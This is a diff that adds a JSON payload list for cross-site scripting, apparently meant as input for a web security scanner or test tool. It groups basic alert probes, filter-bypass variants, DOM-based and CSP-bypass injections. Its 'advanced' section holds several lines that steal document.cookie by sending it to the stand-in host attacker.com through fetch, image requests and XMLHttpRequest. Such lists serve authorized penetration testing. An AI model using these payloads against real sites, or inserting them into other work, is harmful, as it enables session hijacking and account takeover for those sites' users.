@@ -1,0 +1,48 @@
+{
+  "basic": [
+    "<script>alert('XSS')</script>",
+    "<script>alert(document.cookie)</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<img src=x onerror=alert(document.cookie)>",
+    "<svg onload=alert('XSS')>",
+    "<body onload=alert('XSS')>",
+    "<input autofocus onfocus=alert('XSS')>",
+    "<video src=1 onerror=alert('XSS')>",
+    "<audio src=1 onerror=alert('XSS')>"
+  ],
+  "advanced": [
+    "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
+    "<img src=x onerror=fetch('https://attacker.com/steal?cookie='+document.cookie)>",
+    "<script>new Image().src='https://attacker.com/steal?cookie='+document.cookie;</script>",
+    "<script>var xss=new XMLHttpRequest();xss.open('GET','https://attacker.com/steal?cookie='+document.cookie,true);xss.send();</script>"
+  ],
+  "bypass": [
+    "<ScRiPt>alert('XSS')</ScRiPt>",
+    "<script>alert\\u0028'XSS'\\u0029</script>",
+    "<img src=x onerror=alert`XSS`>",
+    "<svg/onload=alert('XSS')>",
+    "<body/onload=alert('XSS')>",
+    "javascript:alert('XSS')",
+    "<script>a='XS';b='S';alert(a+b)</script>",
+    "<script src=data:text/javascript,alert('XSS')></script>",
+    "<div onclick=\"alert('XSS')\"style=position:fixed;top:0;left:0;width:100%;height:100%;></div>",
+    "<details open ontoggle=alert('XSS')>",
+    "<iframe srcdoc=\"<svg onload=alert('XSS')>\">"
+  ],
+  "dom": [
+    "javascript:alert(1)",
+    "#<script>alert('XSS')</script>",
+    "#<img src=x onerror=alert('XSS')>",
+    "?test=<script>alert('XSS')</script>",
+    "?test=<img src=x onerror=alert('XSS')>",
+    "?test=<svg onload=alert('XSS')>",
+    "?q=<script>alert(document.domain)</script>"
+  ],
+  "csp_bypass": [
+    "<script nonce='random123'>alert('XSS with nonce')</script>",
+    "<script nonce='{{csp-nonce}}'>alert('XSS with nonce template')</script>",
+    "<object data='data:text/html,<script>alert(document.domain)</script>'></object>",
+    "<embed src='data:text/html,<script>alert(document.domain)</script>'>",
+    "<iframe src='data:text/html,<script>alert(document.domain)</script>'></iframe>"
+  ]
+}
